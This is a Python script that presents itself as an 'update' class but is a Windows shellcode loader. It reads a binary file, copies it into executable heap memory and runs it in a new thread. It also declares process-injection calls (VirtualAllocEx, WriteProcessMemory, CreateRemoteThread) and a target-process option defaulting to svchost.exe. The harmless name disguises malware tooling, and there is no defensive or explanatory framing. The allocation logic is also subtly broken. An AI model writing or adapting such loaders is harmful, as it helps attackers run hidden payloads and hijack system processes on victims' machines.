#!/usr/bin/env python3

import os
import ctypes
import ctypes.wintypes as wt
import platform
import numpy
import random
import psutil
import argparse


class UpdateClass():

    import os

    script_location = os.path.dirname(os.path.abspath(__file__))
    update_filename = "update_x64.bin"
    update_file_path = os.path.join(script_location, update_filename)

    with open(update_file_path, mode='rb') as file: 
        update_x64 = file.read()

    HEAP_CREATE_ENABLE_EXECUTE = 0x00040000
    HEAP_ZERO_MEMORY = 0x00000008

    PROCESS_SOME_ACCESS = 0x000028
    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    MEM_COMMIT_RESERVE = 0x3000

    PAGE_READWRITE = 0x04
    PAGE_READWRITE_EXECUTE = 0x40
    PAGE_READ_EXECUTE = 0x20

    # CloseHandle()
    CloseHandle = ctypes.windll.kernel32.CloseHandle
    CloseHandle.argtypes = [wt.HANDLE]
    CloseHandle.restype = wt.BOOL

    # CreateRemoteThread()
    CreateRemoteThread = ctypes.windll.kernel32.CreateRemoteThread
    CreateRemoteThread.argtypes = [
        wt.HANDLE, wt.LPVOID, ctypes.c_size_t, wt.LPVOID, wt.LPVOID, wt.DWORD, wt.LPVOID]
    CreateRemoteThread.restype = wt.HANDLE

    # CreateThread()
    CreateThread = ctypes.windll.kernel32.CreateThread
    CreateThread.argtypes = [
        wt.LPVOID, ctypes.c_size_t, wt.LPVOID,
        wt.LPVOID, wt.DWORD, wt.LPVOID
    ]

    # HeapCreate()
    HeapCreate = ctypes.windll.kernel32.HeapCreate
    HeapCreate.argtypes = [wt.DWORD, ctypes.c_size_t, ctypes.c_size_t]
    HeapCreate.restype = wt.HANDLE

    # HeapAlloc()
    HeapAlloc = ctypes.windll.kernel32.HeapAlloc
    HeapAlloc.argtypes = [wt.HANDLE, wt.DWORD, ctypes.c_size_t]
    HeapAlloc.restype = wt.LPVOID

    # OpenProcess()
    OpenProcess = ctypes.windll.kernel32.OpenProcess
    OpenProcess.argtypes = [wt.DWORD, wt.BOOL, wt.DWORD]
    OpenProcess.restype = wt.HANDLE

    # RtlMoveMemory()
    RtlMoveMemory = ctypes.windll.kernel32.RtlMoveMemory
    RtlMoveMemory.argtypes = [wt.LPVOID, wt.LPVOID, ctypes.c_size_t]
    RtlMoveMemory.restype = wt.LPVOID

    # VirtualAllocEx()
    VirtualAllocEx = ctypes.windll.kernel32.VirtualAllocEx
    VirtualAllocEx.argtypes = [wt.HANDLE, wt.LPVOID, ctypes.c_size_t, wt.DWORD, wt.DWORD]
    VirtualAllocEx.restype = wt.LPVOID

    # VirtualProtectEx()
    VirtualProtectEx = ctypes.windll.kernel32.VirtualProtectEx
    VirtualProtectEx.argtypes = [
        wt.HANDLE, wt.LPVOID, ctypes.c_size_t, wt.DWORD, wt.LPVOID]
    VirtualProtectEx.restype = wt.BOOL

    # WaitForSingleObject
    WaitForSingleObject = ctypes.windll.kernel32.WaitForSingleObject
    WaitForSingleObject.argtypes = [wt.HANDLE, wt.DWORD]
    WaitForSingleObject.restype = wt.DWORD

    # WriteProcessMemory()
    WriteProcessMemory = ctypes.windll.kernel32.WriteProcessMemory
    WriteProcessMemory.argtypes = [
        wt.HANDLE, wt.LPVOID, wt.LPCVOID, ctypes.c_size_t, wt.LPVOID]
    WriteProcessMemory.restype = wt.BOOL


    def __init__(self, updatecode=None, method=0, preferred_process='svchost.exe'):
 
        if updatecode is None and platform.architecture()[0] == '64bit':
            self.updatecode = self.update_x64

        self.preferred_process = preferred_process
        if method == 0:
            self.execute()


    def execute(self):
        heap = self.HeapCreate(
            self.HEAP_CREATE_ENABLE_EXECUTE, len(self.updatecode), 0)
        self.HeapAlloc(heap, self.HEAP_ZERO_MEMORY, len(self.updatecode))
        self.RtlMoveMemory(heap, self.updatecode, len(self.updatecode))
        thread = self.CreateThread(0, 0, heap, 0, 0, 0)
        self.WaitForSingleObject(thread, 0xFFFFFFFF)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument(
        '-m', '--method', type=int, default=0,
        help='method 0: same process, method 1: spawn remote process'
    )
    parser.add_argument(
        '-p', default='svchost.exe',
        help='process name to target for update'
    )
    args = parser.parse_args()
    UpdateClass(method=args.method)
